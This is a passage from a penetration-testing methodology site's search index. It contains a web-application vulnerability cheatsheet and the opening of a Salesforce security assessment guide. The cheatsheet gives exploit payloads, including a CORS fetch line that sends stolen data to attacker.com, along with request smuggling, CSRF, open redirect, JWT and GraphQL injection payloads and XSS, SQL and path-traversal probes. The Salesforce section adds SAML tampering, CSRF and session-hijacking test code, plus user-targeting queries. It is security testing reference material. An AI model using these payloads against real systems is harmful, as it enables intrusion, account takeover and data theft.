ABC124\n/order/user123 \u2192 user456\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#http-request-smuggling","title":"HTTP REQUEST SMUGGLING","text":"<p>Present when: Frontend/backend servers parse HTTP requests differently</p> <p>Manual: Send conflicting Content-Length/Transfer-Encoding headers Automated: <pre><code>smuggler.py -u target.com\nhttpreqsmuggler target.com\n</code></pre></p> <p>Exploit: <pre><code># CL.TE\nPOST / HTTP/1.1\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#business-logic-flaws","title":"BUSINESS LOGIC FLAWS","text":"<p>Present when: Application workflow can be manipulated for unintended outcomes</p> <p>Manual: Skip steps, negative values, race conditions, replay attacks Automated: <pre><code># Race condition testing\nffuf -w numbers.txt -u target.com/transfer -X POST -d \"amount=1000\" -t 50\n</code></pre></p> <p>Exploit: <pre><code>{\"price\": -100}\n{\"quantity\": -1}\n{\"role\": \"admin\"}\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#cache-poisoning","title":"CACHE POISONING","text":"<p>Present when: Web caches store responses based on manipulable headers</p> <p>Manual: Modify Host header, X-Forwarded-Host, observe cached responses Automated: <pre><code>web-cache-vulnerability-scanner -u target.com\nparam-miner --target target.com\n</code></pre></p> <p>Exploit: <pre><code>GET / HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#cors-misconfiguration","title":"CORS MISCONFIGURATION","text":"<p>Present when: Access-Control headers are overly permissive</p> <p>Manual: Check if Origin reflects in Access-Control-Allow-Origin Automated: <pre><code>corsy -u target.com\nnuclei -u target.com -t cors/\n</code></pre></p> <p>Exploit: <pre><code>// If ACAO: * with credentials\nfetch('https://target.com/api/sensitive', {credentials: 'include'})\n.then(r=&gt;r.text()).then(d=&gt;fetch('//attacker.com?data='+btoa(d)))\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#open-redirect","title":"OPEN REDIRECT","text":"<p>Present when: Redirect destinations come from untrusted user input</p> <p>Manual: Modify redirect parameters to external domains Automated: <pre><code>openredirex -l urls.txt\nnuclei -u target.com -t redirect/\n</code></pre></p> <p>Exploit: <pre><code>?redirect=//evil.com\n?url=https://evil.com\n?next=/\\evil.com\n?return_to=//evil.com%2e.target.com\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#clickjacking","title":"CLICKJACKING","text":"<p>Present when: X-Frame-Options/CSP frame-ancestors missing</p> <p>Manual: Check response headers for frame protection Automated: <pre><code>clickjacker -u target.com\nnuclei -u target.com -t clickjacking/\n</code></pre></p> <p>Exploit: <pre><code>&lt;iframe src=\"https://target.com/admin/delete?id=123\" style=\"opacity:0.1\"&gt;&lt;/iframe&gt;\n&lt;div style=\"position:absolute;\"&gt;CLICK HERE FOR FREE MONEY!&lt;/div&gt;\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#csrf-cross-site-request-forgery","title":"CSRF (CROSS-SITE REQUEST FORGERY)","text":"<p>Present when: State-changing requests lack proper anti-CSRF tokens Cross-Site Request Forgery (CSRF) Manual: Remove CSRF tokens, check if requests still work Automated: <pre><code>xsrfprobe -u target.com\nburp csrf scanner extension\n</code></pre></p> <p>Exploit: <pre><code>&lt;form action=\"https://target.com/transfer\" method=\"POST\"&gt;\n&lt;input name=\"to\" value=\"attacker\"&gt;\n&lt;input name=\"amount\" value=\"1000\"&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit()&lt;/script&gt;\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#subdomain-takeover","title":"SUBDOMAIN TAKEOVER","text":"<p>Present when: DNS points to unclaimed cloud services</p> <p>Manual: Check CNAME records, try claiming the service Automated: <pre><code>subjack -w subdomains.txt -t 100 -timeout 30\nnuclei -u target.com -t takeovers/\n</code></pre></p> <p>Exploit: <pre><code># If CNAME points to unclaimed service\ndig subdomain.target.com\n# If points to xxx.github.io - claim that GitHub pages\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#jwt-vulnerabilities","title":"JWT VULNERABILITIES","text":"<p>Present when: JSON Web Tokens lack proper validation</p> <p>Manual: Decode JWT, modify payload/header, test none algorithm Automated: <pre><code>jwt_tool token.jwt -C -d wordlist.txt\njwttool.py -t token.jwt\n</code></pre></p> <p>Exploit: <pre><code># None algorithm\n{\"alg\":\"none\",\"typ\":\"JWT\"}\n\n# Algorithm confusion\njwt_tool token.jwt -X k -pk public.pem\n\n# Weak secret\njwt_tool token.jwt -C -d rockyou.txt\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#graphql-injection","title":"GRAPHQL INJECTION","text":"<p>Present when: GraphQL endpoints lack proper input validation</p> <p>Manual: Send malformed queries, introspection queries Automated: <pre><code>graphql-cop -t target.com/graphql\nnuclei -u target.com -t graphql/\n</code></pre></p> <p>Exploit: <pre><code># Introspection\n{__schema{types{name fields{name type{name}}}}}\n\n# Injection\n{user(id: \"1' OR 1=1--\") {name email}}\n\n# DoS\nquery {users(first: 99999999) {name}}\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#websocket-vulnerabilities","title":"WEBSOCKET VULNERABILITIES","text":"<p>Present when: WebSocket connections lack proper authentication/validation</p> <p>Manual: Connect to WebSocket, send malformed/privileged messages Automated: <pre><code>websocket-harness -u ws://target.com/ws\nwsrecon target.com\n</code></pre></p> <p>Exploit: <pre><code>ws = new WebSocket(\"ws://target.com/ws\");\nws.send('{\"action\":\"admin\",\"cmd\":\"delete_user\",\"id\":\"victim\"}');\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#quick-identification-checklist","title":"QUICK IDENTIFICATION CHECKLIST","text":"<pre><code># Immediate checks\ncurl -k https://target.com/robots.txt\ncurl -k https://target.com/.git/config  \ncurl -k https://target.com/admin\ncurl -k -H \"Host: evil.com\" https://target.com\n\n# Quick tests\necho '\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;' # XSS\necho \"' OR 1=1--\" # SQL\necho \"../../../etc/passwd\" # LFI\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/","title":"Salesforce   1","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Pre-Engagement Setup</li> <li>Reconnaissance &amp; Intelligence Gathering</li> <li>Authentication Security Assessment</li> <li>Authorization &amp; Access Control Testing</li> <li>Data Security Evaluation</li> <li>Custom Code Security Analysis</li> <li>Platform Configuration Security</li> <li>API Security Testing</li> <li>Integration Security Assessment</li> <li>Advanced Attack Vectors</li> <li>Post-Exploitation &amp; Persistence</li> <li>Detection Evasion</li> <li>Reporting &amp; Evidence Collection</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#pre-engagement-setup","title":"Pre-Engagement Setup","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#essential-tools","title":"Essential Tools","text":"<ul> <li>Salesforce CLI (sfdx): Metadata manipulation and org access</li> <li>Burp Suite Professional: API interception and manipulation</li> <li>Salesforce Inspector: Browser extension for metadata exploration</li> <li>Postman: API testing and automation</li> <li>PMD with Apex Rules: Static code analysis</li> <li>simple_salesforce (Python): Automated API testing</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#initial-access-validation","title":"Initial Access Validation","text":"<pre><code>-- Verify current user context\nSELECT Id, Username, Profile.Name, UserRole.Name, \n       Profile.PermissionsModifyAllData, Profile.PermissionsViewAllData\nFROM User WHERE Id = :UserInfo.getUserId()\n\n-- Check organization details\nSELECT Id, Name, OrganizationType, InstanceName, IsSandbox, Edition\nFROM Organization\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#reconnaissance-intelligence-gathering","title":"Reconnaissance &amp; Intelligence Gathering","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-salesforce-instance-discovery","title":"1. Salesforce Instance Discovery","text":"<p>Objective: Identify all Salesforce instances and public attack surfaces.</p> <p>Methods: <pre><code># Subdomain enumeration\nsubfinder -d target.com | grep -E \"(salesforce|force|lightning|my\\.salesforce)\"\namass enum -passive -d target.com | grep -E \"(salesforce|force|lightning)\"\n\n# Certificate transparency analysis\ncurl -s \"https://crt.sh/?q=%.target.com&amp;output=json\" | jq -r '.[].name_value' | grep -E \"(salesforce|force|lightning)\"\n\n# DNS enumeration\ndig TXT target.com | grep -i salesforce\ndig CNAME www.target.com | grep -i salesforce\n</code></pre></p> <p>Impact: Reveals additional attack surfaces and potential shadow IT implementations.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-organization-metadata-enumeration","title":"2. Organization Metadata Enumeration","text":"<p>Objective: Gather critical organizational information and identify edition-specific features.</p> <p>SOQL Queries: <pre><code>-- Comprehensive org information\nSELECT Id, Name, OrganizationType, InstanceName, IsSandbox, \n       LanguageLocaleKey, DefaultLocaleSidKey, TimeZoneSidKey, \n       CreatedDate, Edition, TrialExpirationDate\nFROM Organization\n\n-- Feature availability detection\nSELECT Id, FeatureType, Name, ParentId \nFROM Feature WHERE IsEnabled = true\n\n-- License information\nSELECT Id, Name, Status, UsedLicenses, TotalLicenses, LicenseDefinitionKey\nFROM UserLicense\n\n-- API version capabilities\nSELECT Id, VersionNumber, Status, ReleaseDate\nFROM ApiVersion ORDER BY VersionNumber DESC\n</code></pre></p> <p>Impact: Understanding platform capabilities and limitations for targeted attack planning.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-user-role-intelligence","title":"3. User &amp; Role Intelligence","text":"<p>Objective: Map organizational hierarchy and identify high-value targets.</p> <p>SOQL Queries: <pre><code>-- Comprehensive user enumeration\nSELECT Id, Username, Email, Name, Title, Department, Division, \n       IsActive, LastLoginDate, LastPasswordChangeDate, \n       Profile.Name, UserRole.Name, UserType, CreatedDate,\n       NumberOfFailedLogins, PasswordNeverExpires\nFROM User \nORDER BY LastLoginDate DESC NULLS LAST\n\n-- Administrative user identification\nSELECT Id, Username, Email, Name, Profile.Name, UserRole.Name, \n       LastLoginDate, IsActive, CreatedDate\nFROM User \nWHERE Profile.Name IN ('System Administrator', 'System Administrator Light') \n   OR Profile.PermissionsModifyAllData = true \n   OR Profile.PermissionsViewAllData = true\n\n-- External and partner users\nSELECT Id, Username, Email, UserType, ContactId, AccountId, \n       IsActive, LastLoginDate, CreatedDate\nFROM User \nWHERE UserType IN ('PowerPartner', 'PowerCustomerSuccess', \n                  'CustomerSuccess', 'Partner', 'Guest', 'CspLitePortal')\n\n-- Recently created users (potential backdoors)\nSELECT Id, Username, Email, Name, CreatedDate, CreatedBy.Name, \n       IsActive, LastLoginDate\nFROM User \nWHERE CreatedDate = LAST_N_DAYS:30 \nORDER BY CreatedDate DESC\n\n-- Service accounts identification\nSELECT Id, Username, Email, Name, IsActive, LastLoginDate, CreatedDate\nFROM User \nWHERE (Name LIKE '%service%' OR Name LIKE '%integration%' \n    OR Name LIKE '%api%' OR Username LIKE '%service%' \n    OR Username LIKE '%integration%' OR Username LIKE '%api%')\n</code></pre></p> <p>Impact: Identifies high-value targets for social engineering and credential attacks.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#4-custom-code-object-discovery","title":"4. Custom Code &amp; Object Discovery","text":"<p>Objective: Enumerate custom attack surface including Apex, Visualforce, and Lightning components.</p> <p>SOQL Queries: <pre><code>-- Custom objects\nSELECT QualifiedApiName, Label, PluralLabel, IsCustomizable, \n       KeyPrefix, RecordTypesSupported\nFROM EntityDefinition \nWHERE IsCustomizable = true AND NamespacePrefix = null\n\n-- Apex classes\nSELECT Id, Name, Body, LengthWithoutComments, ApiVersion, \n       CreatedDate, CreatedBy.Name, LastModifiedDate, \n       LastModifiedBy.Name, Status, NamespacePrefix\nFROM ApexClass \nWHERE Status = 'Active' AND NamespacePrefix = null\n\n-- Apex triggers\nSELECT Id, Name, TableEnumOrId, Body, ApiVersion, Status,\n       UsageBeforeInsert, UsageAfterInsert, UsageBeforeUpdate, \n       UsageAfterUpdate, UsageBeforeDelete, UsageAfterDelete\nFROM ApexTrigger \nWHERE Status = 'Active'\n\n-- Visualforce pages\nSELECT Id, Name, Markup, ControllerType, CreatedDate, \n       CreatedBy.Name, LastModifiedDate, IsAvailableInTouch\nFROM ApexPage\n\n-- Lightning components\nSELECT Id, DeveloperName, Description, Source, CreatedDate\nFROM LightningComponentBundle \nWHERE IsDeleted = false\n\n-- REST endpoints\nSELECT Id, DeveloperName, NamespacePrefix, HttpMethods, \n       Description, Status\nFROM RestResource \nWHERE Status = 'Active'\n</code></pre></p> <p>Impact: Identifies custom code that likely contains vulnerabilities absent from standard Salesforce functionality.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#authentication-security-assessment","title":"Authentication Security Assessment","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-password-policy-evaluation","title":"1. Password Policy Evaluation","text":"<p>Objective: Assess password requirements and account lockout policies.</p> <p>Navigation: Setup \u2192 Security \u2192 Password Policies</p> <p>SOQL Query: <pre><code>-- Password policy configuration (if accessible)\nSELECT ComplexityRequirement, MinPasswordLength, PasswordLockoutThreshold,\n       LockoutInterval, MaxPasswordAge, MinPasswordAge,\n       PasswordHistoryRestriction, QuestionRestriction\nFROM PasswordPolicy\n</code></pre></p> <p>Manual Checks: - Minimum password length (\u226512 recommended) - Complexity requirements (uppercase, lowercase, numbers, symbols) - Password history (prevent last 3-5 passwords) - Lockout threshold (\u22645 failed attempts) - Lockout duration (\u226515 minutes)</p> <p>Automated Testing: <pre><code>def test_password_policy_weakness(base_url, username):\n    \"\"\"Test password policy enforcement\"\"\"\n    weak_passwords = [\n        \"password123\", \"123456789\", \"qwerty123\", \n        \"admin123\", \"welcome123\", \"Password1\"\n    ]\n\n    lockout_threshold = 0\n    for password in weak_passwords:\n        response = requests.post(f\"{base_url}/login.jsp\", \n                               data={'username': username, 'pw': password})\n        lockout_threshold += 1\n\n        if \"invalid login\" in response.text.lower():\n            print(f\"Attempt {lockout_threshold}: Weak password rejected\")\n        elif \"locked\" in response.text.lower():\n            print(f\"Account locked after {lockout_threshold} attempts\")\n            break\n\n    return lockout_threshold\n</code></pre></p> <p>Impact: Weak policies enable brute force and credential stuffing attacks.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-multi-factor-authentication-mfa-assessment","title":"2. Multi-Factor Authentication (MFA) Assessment","text":"<p>Objective: Evaluate MFA implementation and identify potential bypasses.</p> <p>SOQL Queries: <pre><code>-- Users without MFA enrolled\nSELECT Id, Username, Email, Name, Profile.Name, LastLoginDate,\n       (SELECT COUNT() FROM TwoFactorInfo WHERE UserId = User.Id) as MFA_Methods\nFROM User \nWHERE IsActive = true \nHAVING MFA_Methods = 0\n\n-- MFA method analysis\nSELECT Id, UserId, User.Username, User.Email, Type, IsActive, \n       CreatedDate, LastUsedDate\nFROM TwoFactorInfo \nORDER BY LastUsedDate DESC NULLS LAST\n\n-- Profile MFA requirements\nSELECT Id, Name, RequiresMfa\nFROM Profile\n\n-- Login flow MFA requirements\nSELECT Id, DeveloperName, UsedForAuthentication, Description\nFROM Flow \nWHERE Type = 'LoginFlow' AND Status = 'Active'\n</code></pre></p> <p>MFA Bypass Testing: <pre><code># Test API access bypass\ncurl -X POST https://instance.salesforce.com/services/oauth2/token \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"grant_type=password&amp;client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;username=USER&amp;password=PASS\"\n\n# Test session fixation\ndocument.cookie = \"sid_Client=fixed_session_value; domain=.salesforce.com; path=/\";\n</code></pre></p> <p>Impact: Users without MFA are vulnerable to account takeover via credential compromise.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-session-security-analysis","title":"3. Session Security Analysis","text":"<p>Objective: Evaluate session management controls and identify session-based vulnerabilities.</p> <p>Navigation: Setup \u2192 Security \u2192 Session Settings</p> <p>Critical Settings: - Session Security Level: High Assurance - Lock sessions to IP address: Enabled - Lock sessions to domain: Enabled - Disable concurrent sessions: Enabled - Session timeout: \u22642 hours - Force logout on timeout: Enabled</p> <p>Session Testing: <pre><code>def test_session_hijacking(original_session, target_ip):\n    \"\"\"Test session hijacking from different IP\"\"\"\n    headers = {\n        'Cookie': f'sid_Client={original_session}',\n        'X-Forwarded-For': target_ip,\n        'User-Agent': 'AttackerAgent/1.0'\n    }\n\n    response = requests.get(\n        'https://instance.salesforce.com/home/home.jsp',\n        headers=headers\n    )\n\n    if response.status_code == 200:\n        print(\"Session hijacking successful - IP locking not implemented\")\n    else:\n        print(\"Session hijacking failed - IP locking active\")\n</code></pre></p> <p>CSRF Testing: <pre><code>&lt;!-- CSRF test payload --&gt;\n&lt;form action=\"https://instance.salesforce.com/setup/own/users.jsp\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"save\" value=\"1\"&gt;\n    &lt;input type=\"hidden\" name=\"id\" value=\"005XX000001b0Qw\"&gt;\n    &lt;input type=\"hidden\" name=\"IsActive\" value=\"false\"&gt;\n    &lt;input type=\"submit\" value=\"Disable User Account\"&gt;\n&lt;/form&gt;\n</code></pre></p> <p>Impact: Weak session controls enable session hijacking and CSRF attacks.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#4-single-sign-on-sso-security","title":"4. Single Sign-On (SSO) Security","text":"<p>Objective: Evaluate SSO implementation for security weaknesses and potential bypasses.</p> <p>SOQL Queries: <pre><code>-- SAML SSO settings\nSELECT Id, Name, Issuer, EntityId, IdentityLocation, \n       IdentityMapping, AttributeFormat, OptionsSpInitBinding\nFROM SamlSsoConfig\n\n-- Connected apps with SSO\nSELECT Id, Name, CallbackUrl, ConsumerKey, UsePkce, \n       OptionsFullScopeApprovals, OptionsRefreshTokenValidityMetric\nFROM ConnectedApplication \nWHERE CallbackUrl LIKE '%saml%' OR CallbackUrl LIKE '%sso%'\n</code></pre></p> <p>SAML Response Manipulation: <pre><code>&lt;!-- Test SAML assertion tampering --&gt;\n&lt;saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"&gt;\n    &lt;saml:Subject&gt;\n        &lt;saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\"&gt;\n            admin@target.com &lt;!-- Privilege escalation attempt --&gt;\n        &lt;/saml:NameID&gt;\n    &lt;/saml:Subject&gt;\n    &lt;saml:AttributeStatement&gt;\n        &lt;saml:Attribute Name=\"Profile\"&gt;\n            &lt;saml:AttributeValue&gt;System Administrator&lt;/saml:AttributeValue&gt;\n        &lt;/saml:Attribute&gt;\n    &lt;/saml:AttributeStatement&gt;\n&lt;/saml:Assertion&gt;\n</code></pre></p> <p>SSO Bypass Testing: <pre><code># Test direct login bypass\ncurl -X POST https://instance.salesforce.com/login.jsp \\\n  -d \"username=user@domain.com&amp;pw=password\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\"\n</code></pre></p> <p>Impact: SSO vulnerabilities can lead to authentication bypass and privilege escalation.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#authorization-access-control-testing","title":"Authorization &amp; Access Control Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-profile-permission-analysis","title":"1. Profile &amp; Permission Analysis","text":"<p>Objective: Identify privilege escalation opportunities and excessive permissions.</p> <p>High-Privilege Discovery: <pre><code>-- System administrators and equivalent users\nSELECT Id, Username, Email, Name, Profile.Name, UserRole.Name, \n       IsActive, LastLoginDate, CreatedDate,\n       Profile.PermissionsModifyAllData, Profile.PermissionsViewAllData,\n       Profile.PermissionsManageUsers, Profile.PermissionsCustomizeApplication\nFROM User \nWHERE Profile.PermissionsModifyAllData = true \n   OR Profile.PermissionsViewAllData = true \n   OR Profile.PermissionsManageUsers = true\n   OR Profile.PermissionsCustomizeApplication = true\nORDER BY LastLoginDate DESC NULLS LAST\n\n-- Dangerous permission combinations\nSELECT Id, Username, Profile.Name,\n       Profile.PermissionsModifyAllData as ModifyAll,\n       Profile.PermissionsViewAllData as ViewAll,\n       Profile.PermissionsManageUsers as ManageUsers,\n       Profile.PermissionsCustomizeApplication as CustomizeApp,\n       Profile.PermissionsApiEnabled as ApiEnabled\nFROM User \nWHERE Profile.PermissionsModifyAllData = true \n   OR (Profile.PermissionsViewAllData = true AND Profile.PermissionsManageUsers = true)\n   OR Profile.PermissionsCustomizeApplication = true\n\n-- Recently elevated users\nSELECT Id, Username, Email, Name, Profile.Name, CreatedDate,\n       (SELECT COUNT() FROM PermissionSetAssignment \n        WHERE AssigneeId = User.Id AND CreatedDate = LAST_N_DAYS:30) as Recent_PermSets\nFROM User \nWHERE Profile.Name LIKE '%Admin%' \n  AND CreatedDate = LAST_N_DAYS:90\n</code></pre></p> <p>Permission Set Analysis: <pre><code>-- High-risk permission sets\nSELECT Id, Name, Description, Type, IsOwnedByProfile,\n       PermissionsModifyAllData, PermissionsViewAllData,\n       PermissionsManageUsers, PermissionsCustomizeApplication,\n       PermissionsApiEnabled,\n       (SELECT COUNT() FROM PermissionSetAssignment \n        WHERE PermissionSetId = PermissionSet.Id) as AssigneeCount\nFROM PermissionSet \nWHERE PermissionsModifyAllData = true \n   OR PermissionsViewAllData = true \n   OR PermissionsManageUsers = true\n   OR PermissionsCustomizeApplication = true\nORDER BY AssigneeCount DESC\n\n-- Permission set assignments with potential issues\nSELECT Id, PermissionSet.Name, PermissionSet.PermissionsModifyAllData,\n       Assignee.Username, Assignee.Profile.Name, AssignmentId,\n       ExpirationDate, CreatedDate, CreatedBy.Name\nFROM PermissionSetAssignment \nWHERE ExpirationDate != null \n   OR (PermissionSet.PermissionsModifyAllData = true AND ExpirationDate = null)\nORDER BY CreatedDate DESC\n</code></pre></p> <p>Impact: Over-privileged users can lead to complete tenant compromise.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-field-level-security-assessment","title":"2. Field-Level Security Assessment","text":"<p>Objective: Identify sensitive data exposure through inadequate field-level security.</p> <p>Sensitive Field Discovery: <pre><code>-- Potentially sensitive fields identification\nSELECT EntityDefinition.QualifiedApiName as ObjectName,\n       QualifiedApiName as FieldName, Label, DataType, \n       IsEncrypted, SecurityClassification, ComplianceGroup,\n       Description\nFROM FieldDefinition \nWHERE (Label LIKE '%SSN%' OR Label LIKE '%Social Security%' \n    OR Label LIKE '%Tax%' OR Label LIKE '%EIN%' OR Label LIKE '%TIN%'\n    OR Label LIKE '%Credit Card%' OR Label LIKE '%Bank%' \n    OR Label LIKE '%Account Number%' OR Label LIKE '%Routing%'\n    OR Label LIKE '%Password%' OR Label LIKE '%Secret%' \n    OR Label LIKE '%Key%' OR Label LIKE '%Token%'\n    OR Label LIKE '%Salary%' OR Label LIKE '%Income%'\n    OR Label LIKE '%DOB%' OR Label LIKE '%Birth%')\n   AND IsEncrypted = false\nORDER BY EntityDefinition.QualifiedApiName, SecurityClassification DESC\n\n-- Field accessibility by profile\nSELECT Id, Field, Parent.Name as ProfileName, \n       PermissionsRead, PermissionsEdit\nFROM FieldPermissions \nWHERE Field IN (\n    SELECT QualifiedApiName FROM FieldDefinition \n    WHERE Label LIKE '%SSN%' OR Label LIKE '%Credit%' \n       OR Label LIKE '%Password%' OR Label LIKE '%Salary%'\n)\nORDER BY Field, Parent.Name\n</code></pre></p> <p>Field Access Testing: <pre><code>// Apex script to test field accessibility\npublic class FieldSecurityTester {\n    public static void testFieldAccess(String objectName, String fieldName) {\n        Schema.SObjectType objectType = Schema.getGlobalDescribe().get(objectName);\n        Schema.DescribeSObjectResult objectDescribe = objectType.getDescribe();\n        Schema.SObjectField field = objectDescribe.fields.getMap().get(fieldName);\n\n        if (field != null) {\n            Schema.DescribeFieldResult fieldDescribe = field.getDescribe();\n            System.debug('Field: ' + fieldName);\n            System.debug('Accessible: ' + fieldDescribe.isAccessible());\n            System.debug('Updateable: ' + fieldDescribe.isUpdateable());\n            System.debug('Createable: ' + fieldDescribe.isCreateable());\n\n            // Test actual data access\n            try {\n                String query = 'SELECT Id, ' + fieldName + ' FROM ' + objectName + ' LIMIT 1';\n                List&lt;SObject&gt; records = Database.query(query);\n                System.debug('Query successful - field accessible');\n            } catch (Exception e) {\n                System.debug('Query failed: ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Unauthorized access to sensitive field data, PII exposure, compliance violations.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-record-level-security-analysis","title":"3. Record-Level Security Analysis","text":"<p>Objective: Evaluate sharing model security and identify unauthorized record access.</p> <p>Organization-Wide Defaults Assessment: <pre><code>-- Organization-wide default settings\nSELECT Id, SobjectType, DefaultInternal, DefaultExternal,\n       DefaultCaseOwnerId, DefaultOpportunityOwnerId\nFROM OrganizationWideDefault \nWHERE DefaultInternal = 'Public' OR DefaultExternal = 'Public'\n</code></pre></p> <p>Sharing Rules Analysis: <pre><code>-- Account sharing rules\nSELECT Id, Name, AccountAccessLevel, CaseAccessLevel, \n       ContactAccessLevel, OpportunityAccessLevel, \n       AccessMapping, Description, SharedToType\nFROM AccountSharingRule \nWHERE AccountAccessLevel IN ('Edit', 'All')\n\n-- Custom object sharing rules  \nSELECT Id, Name, AccessLevel, SobjectType, Description,\n       SharedToType, SharedTo\nFROM CustomObjectSharingRule \nWHERE AccessLevel IN ('Edit', 'All')\n\n-- Manual sharing analysis\nSELECT Id, UserOrGroupId, AccountId, AccountAccessLevel, \n       RowCause, IsDeleted, LastModifiedDate, LastModifiedBy.Name\nFROM AccountShare \nWHERE RowCause = 'Manual' AND AccountAccessLevel IN ('Edit', 'All')\nORDER BY LastModifiedDate DESC\n</code></pre></p> <p>Record Access Testing: <pre><code>// Test record accessibility across different user contexts\npublic class RecordAccessTester {\n    public static void testRecordAccess(Id recordId, Id userId) {\n        System.runAs(new User(Id = userId)) {\n            try {\n                String objectType = recordId.getSObjectType().getDescribe().getName();\n                String query = 'SELECT Id, Name FROM ' + objectType + ' WHERE Id = :recordId';\n                List&lt;SObject&gt; records = Database.query(query);\n\n                if (!records.isEmpty()) {\n                    System.debug('Record accessible to user: ' + userId);\n\n                    // Test edit access\n                    SObject record = records[0];\n                    try {\n                        update record;\n                        System.debug('Record editable by user: ' + userId);\n                    } catch (DmlException e) {\n                        System.debug('Record not editable: ' + e.getMessage());\n                    }\n                }\n            } catch (QueryException e) {\n                System.debug('Record not accessible: ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Horizontal privilege escalation, unauthorized access to sensitive records.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#4-guest-user-security-assessment","title":"4. Guest User Security Assessment","text":"<p>Objective: Evaluate guest user security and identify potential abuse vectors.</p> <p>Guest User Configuration Analysis: <pre><code>-- Guest user profiles and permissions\nSELECT Id, Name, UserType, PermissionsApiEnabled, PermissionsRunReports,\n       PermissionsViewSetup, PermissionsModifyAllData, PermissionsViewAllData\nFROM Profile \nWHERE Name LIKE '%Guest%' OR UserType = 'Guest'\n\n-- Site guest user settings\nSELECT Id, Name, Status, AdminId, GuestUserId, AnalyticsTrackingCode,\n       ClickjackProtectionLevel, GuestUserProfile.Name,\n       GuestUserProfile.PermissionsApiEnabled\nFROM Site \nWHERE Status = 'Active'\n\n-- Guest user record access via OWD\nSELECT Id, SobjectType, DefaultExternal\nFROM OrganizationWideDefault \nWHERE DefaultExternal IN ('Public', 'PublicReadOnly', 'PublicReadWrite')\n</code></pre></p> <p>Guest User Exploitation Testing: <pre><code>// Guest user API access testing (unauthenticated context)\nfetch('/services/data/v52.0/sobjects/', {\n    method: 